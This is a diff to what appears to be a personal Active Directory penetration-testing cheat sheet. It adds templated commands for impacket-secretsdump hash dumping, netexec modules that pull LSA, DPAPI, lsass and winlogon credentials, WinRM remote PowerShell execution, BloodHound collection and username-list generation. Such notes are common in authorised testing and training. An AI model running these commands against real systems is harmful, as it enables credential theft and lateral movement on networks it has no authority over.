@@ -62,10 +62,10 @@ netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M maq
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M get-desc-users
 # Read DACL Rights
 https://www.netexec.wiki/ldap-protocol/read-dacl-right
-# Bloodhound Ingestor
-netexec ldap 'IP' --dns-server 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection All
 # List DC IP / Enum Trust
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dc-list
+# Bloodhound Ingestor
+netexec ldap 'IP' --dns-server 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection All
 ```
 
 
@@ -82,6 +82,9 @@ enum4linux-ng -A -u 'USERNAME' -p 'PASSWORD' -t 'TIMEOUT' 'IP'
 ```
 ### impacket
 ```sh
+# dumping NTLM hashs and Kerberos Keys
+impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
+# exec
 impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
@@ -114,6 +117,7 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --lsa
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dpapi
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M ntdsutil
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M lsassy
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M reg-winlogon
 and so on ...
 # Checking for Spooler & WebDav
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M spooler
@@ -146,6 +150,10 @@ smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r '
 ```sh
 evil-winrm -i 'IP' -u 'USERNAME' -p 'PASSWORD'
 ```
+### netexec
+```sh
+netexec winrm 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -X 'POWERSHELLCOMMAND'
+```
 
 
 
@@ -174,7 +182,10 @@ impacket-smbserver -smb2support 'SHARENAME' 'PATH'
 ```sh
 name-that-hash -f 'hash.txt' --no-banner --no-john
 ```
-
+### username-anarchy
+```sh
+./username-anarchy -i userlist.txt > user.txt
+```
 
 
 ## link
@@ -201,8 +212,6 @@ name-that-hash -f 'hash.txt' --no-banner --no-john
 
 
 ## list
-### generate wordlist
-https://github.com/urbanadventurer/username-anarchy
 ### seclists
 ```sh
 └─$ find /usr/share/seclists/Usernames -type f -exec wc -l {} +
